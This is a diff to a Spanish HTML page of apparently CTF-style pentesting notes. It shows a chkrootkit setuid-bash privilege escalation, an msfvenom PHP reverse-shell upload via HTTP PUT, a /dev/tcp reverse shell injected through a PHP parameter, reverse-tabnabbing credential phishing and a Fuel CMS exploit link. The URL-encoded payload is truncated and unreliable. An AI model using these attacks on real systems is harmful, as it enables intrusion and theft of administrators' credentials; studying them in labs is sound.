@@ -136,6 +136,9 @@
         font-size: 1.1rem;
       }
     }
+	code {
+  font-size: 23px;
+}
   </style>
 </head>
 <body>
@@ -156,29 +159,29 @@
      <h2>Nombre personalizado de un dominio en una ip</h2>
 
     <p>
-      Al entrar a una ip (ej: http://10.2.168.99/), y aparece con un nombre de dominio (ej: http://vtcsec) y 
+      Al entrar a una ip, y aparece con un nombre de dominio <code>http://vtcsec</code> y 
       no permite acceder, se soluciona de la siguiente manera.
-      Ejecute "sudo nano /etc/hosts" para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece 
-      "10.2.168.99 vtcsec", guardalo y ya se puede acceder al sitio. 
+      Ejecute <code>sudo nano /etc/hosts</code> para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece 
+      <code>10.2.168.99	  vtcsec</code>, guardalo y ya se puede acceder al sitio. 
     </p>
 
     <h2>chkrootkit 0.49</h2>
 
-    <p>Para explotar este chkrootkit desactualizado debemos estar en "/tmp", luego ejecutar 
-      ( echo "/bin/bash" > /tmp/update ) , luego ( echo "chmod +s /bin/bash" >> /tmp/update ), y finalmente ( /bin/bash -p ). Con esta serie de comandos
-    crea un archivo "/tmp/update" que, al ejecutarse, establece el setuid en "/bin/bash" lo que permite 
-    ejecutar bash con privilegios elevados y luego ejecuta "/bin/bash -p" como usuario root.
+    <p>Para explotar este chkrootkit desactualizado debemos estar en <code>"/tmp"</code>, luego ejecutar 
+      <code> echo "/bin/bash" > /tmp/update </code>, luego <code> echo "chmod +s /bin/bash" >> /tmp/update </code>, y finalmente <code> /bin/bash -p </code>. Con esta serie de comandos
+    crea un archivo <code>/tmp/update</code> que, al ejecutarse, establece el setuid en <code>/bin/bash</code> lo que permite 
+    ejecutar bash con privilegios elevados y luego ejecuta <code>/bin/bash -p</code> como usuario root.
     </p>
 
     <h2>Payload php inverso con metasploit y msfvenom a una pagina con metodo HTTP PUT</h2>
 
-    <p>Para verificar si podemos aprovechar y ejecutar este truco, usamos "curl -v -X OPTIONS (ip o url)", si acepta metodo PUT, 
-      es un buen comienzo. Al tener un servidor con metodo HTTP PUT, se pueden subir archivos con "curl -T archivo 
-      (ip/ruta/archivo) --http1.0", podemos aprovechar esta vulnerabilidad para subir una shell inversa. 
-      <br>Para crear la shell y subirlo a la maquina victima usamos "sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip atacante) 
-      LPORT=(funciona mejor con el 443) -f raw > archivo". 
-      Una vez creado el archivo, ejecutamos metasploit y usamos el "exploit/multi/handler" y seleccionamos el payload 
-      "payload/php/meterpreter_reverse_tcp", lo configuramos con nuestra ip atacante y el puerto que hayamos elejido, despues corremos 
+    <p>Para verificar si podemos aprovechar y ejecutar este truco, usamos <code>curl -v -X OPTIONS (ip o url)</code>, si acepta metodo PUT, 
+      es un buen comienzo. Al tener un servidor con metodo HTTP PUT, se pueden subir archivos con <code>curl -T archivo 
+      (ip/ruta/archivo) --http1.0</code>, podemos aprovechar esta vulnerabilidad para subir una shell inversa. 
+      <br>Para crear la shell y subirlo a la maquina victima usamos <code>sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip atacante) 
+      LPORT=(funciona mejor con el 443) -f raw > archivo</code>. 
+      Una vez creado el archivo, ejecutamos metasploit y usamos el <code>exploit/multi/handler</code> y seleccionamos el payload 
+      <code>payload/php/meterpreter_reverse_tcp</code>, lo configuramos con nuestra ip atacante y el puerto que hayamos elejido, despues corremos 
       el exploit y ejecutamos la shell que subimos al servidor.
     </p>
 
@@ -186,10 +189,28 @@
       Shell reversa a traves de un sitio web con php inseguro
     </h2>
     <p>
-      Si nos encontramos en una situacion como esta " http://10.10.10.10/site/busque.php?buscar= [comando] ", donde un php permite ejecutar comandos del sistema, podemos aprovechar esto para generar una shell reversa, ( /bin/bash -c 'bash -i >& /dev/tcp/ip atacante/puerto 0>&1' ), este comando debemos colocarlo donde el php nos permite enviar codigo, probablemente tengamos que codificarlo en URL por lo que deberia quedar asi ( E10%2F443%200%3E%261%27 ). <br>Una vez codificado debemos usar dos terminales de la maquina atacante, en una colocamos un "nc -lvnp [puerto que hayamos elejido]", y ejecutar en la otra el comando "curl" de esta manera ( curl "http://10.10.10.10/site/busque.php?buscar=E10%2F443%200%3E%261%27" ), finalmente volvemos a la terminal del netcat y ya acabaremos dentro de la maquina.
+      Si nos encontramos en una situacion como esta <code> http://10.10.10.10/site/busque.php?buscar= [comando] </code>, donde un php permite ejecutar comandos del sistema, podemos aprovechar esto para generar una shell reversa, <code> /bin/bash -c 'bash -i >& /dev/tcp/ip atacante/puerto 0>&1' </code>, este comando debemos colocarlo donde el php nos permite enviar codigo, probablemente tengamos que codificarlo en URL por lo que deberia quedar asi <code> E10%2F443%200%3E%261%27 </code>. <br>Una vez codificado debemos usar dos terminales de la maquina atacante, en una colocamos un <code> nc -lvnp [puerto que hayamos elejido]</code>, y ejecutar en la otra el comando <code> curl "http://10.10.10.10/site/busque.php?buscar=E10%2F443%200%3E%261%27" </code>, finalmente volvemos a la terminal del netcat y ya acabaremos dentro de la maquina.
 
     </p>
 
+	<h2>Tabnabbing inverso</h2>
+
+	<p>
+	Si en una pagina nos encontramos con el parametro <code> target="_blank" </code>, se puede explotar usando una replica de la pagina de inicio de sesión, incitando al administrador a introducir sus credenciales cuando haga clic en nuestro enlace, lo que debe contener es este script:</p>
+	<code>
+
+	window.opener.location = ‘http://IP:PUERTO/paginaDeLogin.html';
+	
+	</code>
+	
+	<p>
+	Una vez creado el script debemos guardarlo como html, y en el directorio donde tengamos el script en html y la pagina de login, abrimos un <code>python3 http.server 80</code>, en otro lado un <code>nc -lvnp [puerto del script]</code> y a esperar a que la victima ponga sus credenciales.	
+	</p>
+	
+
+	<h2>Exploit Fuel CMS 1.4.1</h2>
+
+	<p>Si en un servidor nos encontramos con un login asi <code>http://IP/structure/index.php/fuel/login/</code> podemos usar un script que inyecta una shell reversa al ejecutarlo <a href="fuelCMS1.4.1.html">Exploit Fuel CMS 1.4.1</a>. Lo ejecutas asi <code>python3 exploit.py</code> </p>
     <h2>
       Directorios de interes
     </h2>
